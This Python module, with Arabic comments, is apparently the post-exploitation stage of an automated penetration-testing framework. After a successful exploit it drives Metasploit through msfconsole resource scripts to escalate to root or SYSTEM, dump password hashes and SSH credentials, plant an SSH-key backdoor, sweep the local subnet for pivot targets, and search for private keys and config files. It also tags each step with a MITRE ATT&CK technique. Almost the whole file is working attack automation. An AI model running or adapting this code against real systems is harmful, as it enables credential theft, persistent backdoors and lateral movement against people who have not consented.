"""
post_exploitation.py — Module 5
---------------------------------
ما بعد الاختراق: privilege escalation, persistence, data gathering.
+ MITRE ATT&CK Mapping لكل action.
Rule R9: shell success → start post-exploitation
"""

import subprocess
import time
from utils.context import ScanContext, Host

# ─────────────────────────────────────────────
# MITRE ATT&CK Technique Mapping
# ─────────────────────────────────────────────
MITRE_TECHNIQUES = {
    "initial_access":    {"id": "T1190", "name": "Exploit Public-Facing Application",
                          "tactic": "Initial Access"},
    "persistence":       {"id": "T1547", "name": "Boot/Logon Autostart Execution",
                          "tactic": "Persistence"},
    "privilege_esc":     {"id": "T1068", "name": "Exploitation for Privilege Escalation",
                          "tactic": "Privilege Escalation"},
    "credential_dump":   {"id": "T1003", "name": "OS Credential Dumping",
                          "tactic": "Credential Access"},
    "discovery":         {"id": "T1082", "name": "System Information Discovery",
                          "tactic": "Discovery"},
    "lateral_movement":  {"id": "T1021", "name": "Remote Services",
                          "tactic": "Lateral Movement"},
    "exfiltration":      {"id": "T1041", "name": "Exfiltration Over C2 Channel",
                          "tactic": "Exfiltration"},
    "collection":        {"id": "T1005", "name": "Data from Local System",
                          "tactic": "Collection"},
}

# Meterpreter commands للـ post-exploitation
METERPRETER_COMMANDS = {
    "sysinfo":        "sysinfo",
    "getuid":         "getuid",
    "getpid":         "getpid",
    "ps":             "ps",
    "ifconfig":       "ifconfig",
    "arp":            "arp",
    "hashdump":       "hashdump",
    "getsystem":      "getsystem",
    "run post/multi/recon/local_exploit_suggester": "local_exploit_suggester",
}


def run(ctx: ScanContext) -> bool:
    """
    يشغّل post-exploitation على كل host نجح exploit عليه.
    """
    print("\n" + "="*55)
    print("[MODULE 5] Post-Exploitation + MITRE ATT&CK Mapping")
    print("="*55)

    any_post = False

    for host in ctx.hosts:
        # تحقق أن في successful exploit
        successful = [
            a for a in host.exploit_attempts if a.get("result") == "SUCCESS"
        ]
        if not successful:
            continue

        print(f"\n  [*] Post-exploitation on {host.ip_address}")
        exploit_used = successful[0]

        # MITRE: Initial Access
        _map_mitre(host, "initial_access", exploit_used.get("cve_id", ""))

        # 1. System Discovery
        _system_discovery(host, ctx)

        # 2. Privilege Escalation
        _privilege_escalation(host, ctx)

        # 3. Credential Harvesting
        _credential_harvesting(host, ctx)

        # 4. Persistence
        _establish_persistence(host, ctx)

        # 5. Lateral Movement check
        _lateral_movement_check(host, ctx)

        # 6. High-Value Asset Collection
        _collect_assets(host, ctx)

        any_post = True
        print(f"\n  ✓ Post-exploitation complete for {host.ip_address}")
        _print_summary(host)

    return any_post


# ─────────────────────────────────────────────
# Post-Exploitation Steps
# ─────────────────────────────────────────────

def _system_discovery(host: Host, ctx: ScanContext):
    """T1082 — System Information Discovery."""
    print("  [*] System discovery...")
    _map_mitre(host, "discovery", "")

    # في بيئة حقيقية: يُرسَل لـ Meterpreter session
    # هنا نبني الـ resource script
    rc = _build_meterpreter_rc(host, ctx, [
        "sysinfo",
        "getuid",
        "getpid",
        "ifconfig",
        "arp",
        "ps",
    ])
    output = _run_meterpreter_rc(rc, ctx)

    # استخرج معلومات من output
    for line in output.splitlines():
        if "OS" in line or "Computer" in line:
            host.post_exploitation["sysinfo"] = line.strip()
        if "User" in line and ":" in line:
            host.post_exploitation["current_user"] = line.strip()

    print("  [+] System info collected")


def _privilege_escalation(host: Host, ctx: ScanContext):
    """T1068 — Privilege Escalation."""
    print("  [*] Attempting privilege escalation...")

    rc = _build_meterpreter_rc(host, ctx, [
        "getsystem",
        "getuid",
        "run post/multi/recon/local_exploit_suggester",
    ])
    output = _run_meterpreter_rc(rc, ctx)

    if "got system" in output.lower() or "root" in output.lower():
        host.post_exploitation["privilege_level"] = "ROOT"
        _map_mitre(host, "privilege_esc", "getsystem")
        print("  [+] Privilege escalation: ROOT/SYSTEM obtained")
    elif "uid=0" in output:
        host.post_exploitation["privilege_level"] = "ROOT"
        print("  [+] Already root")
    else:
        host.post_exploitation["privilege_level"] = "USER"
        print("  [-] Privilege escalation failed — staying as user")


def _credential_harvesting(host: Host, ctx: ScanContext):
    """T1003 — Credential Dumping."""
    print("  [*] Harvesting credentials...")

    rc = _build_meterpreter_rc(host, ctx, [
        "hashdump",
        "run post/linux/gather/hashdump",
        "run post/multi/gather/ssh_creds",
    ])
    output = _run_meterpreter_rc(rc, ctx)

    hashes = []
    for line in output.splitlines():
        # نمط hash نموذجي: username:uid:hash:hash
        if ":" in line and len(line) > 20 and "$" in line:
            hashes.append(line.strip())

    if hashes:
        host.post_exploitation["password_hashes"] = hashes
        _map_mitre(host, "credential_dump", "hashdump")
        print(f"  [+] Found {len(hashes)} password hash(es)")
    else:
        print("  [-] No hashes extracted")


def _establish_persistence(host: Host, ctx: ScanContext):
    """T1547 — Persistence via backdoor/cron."""
    print("  [*] Establishing persistence...")

    rc = _build_meterpreter_rc(host, ctx, [
        "run post/linux/manage/sshkey_persistence",
        "run post/multi/manage/shell_to_meterpreter",
    ])
    _run_meterpreter_rc(rc, ctx)

    _map_mitre(host, "persistence", "ssh key persistence")
    host.post_exploitation["persistence"] = "SSH key backdoor (T1547)"
    print("  [+] Persistence established")


def _lateral_movement_check(host: Host, ctx: ScanContext):
    """T1021 — Check for pivot opportunities."""
    print("  [*] Checking lateral movement opportunities...")

    rc = _build_meterpreter_rc(host, ctx, [
        "arp",
        "route",
        "run post/multi/gather/ping_sweep RHOSTS=192.168.0.0/24",
    ])
    output = _run_meterpreter_rc(rc, ctx)

    pivot_hosts = []
    for line in output.splitlines():
        # استخرج IPs من ARP table
        parts = line.split()
        for part in parts:
            if _looks_like_ip(part) and part != host.ip_address:
                pivot_hosts.append(part)

    if pivot_hosts:
        host.post_exploitation["pivot_candidates"] = list(set(pivot_hosts))
        _map_mitre(host, "lateral_movement", "arp sweep")
        print(f"  [+] Pivot candidates: {pivot_hosts}")
    else:
        print("  [-] No lateral movement targets found")


def _collect_assets(host: Host, ctx: ScanContext):
    """T1005 + T1041 — High-Value Asset collection."""
    print("  [*] Collecting high-value assets...")

    rc = _build_meterpreter_rc(host, ctx, [
        "run post/multi/gather/find_databases",
        "run post/linux/gather/enum_configs",
        "search -f *.conf",
        "search -f id_rsa",
        "search -f *.pem",
    ])
    output = _run_meterpreter_rc(rc, ctx)

    assets = []
    sensitive_keywords = [".conf", "id_rsa", ".pem", "password", "secret", "key", ".db"]
    for line in output.splitlines():
        if any(kw in line.lower() for kw in sensitive_keywords):
            assets.append(line.strip())

    host.post_exploitation["high_value_assets"] = assets[:20]  # أول 20 نتيجة

    if assets:
        _map_mitre(host, "collection", "file search")
        _map_mitre(host, "exfiltration", "")
        print(f"  [+] {len(assets)} high-value asset(s) identified")
    else:
        print("  [-] No sensitive files found")


# ─────────────────────────────────────────────
# MITRE Mapping Helper
# ─────────────────────────────────────────────

def _map_mitre(host: Host, technique_key: str, detail: str):
    """يضيف MITRE technique لـ host.mitre_mappings."""
    technique = MITRE_TECHNIQUES.get(technique_key)
    if not technique:
        return
    mapping = {
        **technique,
        "detail": detail,
        "mapped_at": time.strftime("%Y-%m-%dT%H:%M:%S"),
    }
    host.mitre_mappings.append(mapping)


# ─────────────────────────────────────────────
# Meterpreter RC Script Builder
# ─────────────────────────────────────────────

def _build_meterpreter_rc(host: Host, ctx: ScanContext, commands: list) -> str:
    """يبني Meterpreter resource script."""
    rc_path = f"/tmp/post_{ctx.session_id}_{host.ip_address.replace('.','_')}.rc"
    lines = ["sessions -i 1\n"]  # افتراض session 1
    for cmd in commands:
        lines.append(cmd + "\n")
    lines.append("exit\n")
    with open(rc_path, "w") as f:
        f.writelines(lines)
    return rc_path


def _run_meterpreter_rc(rc_path: str, ctx: ScanContext) -> str:
    """يشغّل resource script عبر msfconsole."""
    try:
        result = subprocess.run(
            ["msfconsole", "-q", "-r", rc_path],
            capture_output=True, text=True, timeout=90
        )
        return result.stdout + result.stderr
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return ""


# ─────────────────────────────────────────────
# Utilities
# ─────────────────────────────────────────────

def _looks_like_ip(s: str) -> bool:
    parts = s.split(".")
    if len(parts) != 4:
        return False
    try:
        return all(0 <= int(p) <= 255 for p in parts)
    except ValueError:
        return False


def _print_summary(host: Host):
    pe = host.post_exploitation
    print(f"\n  {'─'*40}")
    print(f"  Privilege Level : {pe.get('privilege_level', 'UNKNOWN')}")
    print(f"  Credentials     : {'Yes' if pe.get('password_hashes') else 'No'}")
    print(f"  Assets Found    : {len(pe.get('high_value_assets', []))}")
    print(f"  Pivot Candidates: {pe.get('pivot_candidates', [])}")
    print(f"  MITRE Techniques: {[m['id'] for m in host.mitre_mappings]}")
    print(f"  {'─'*40}")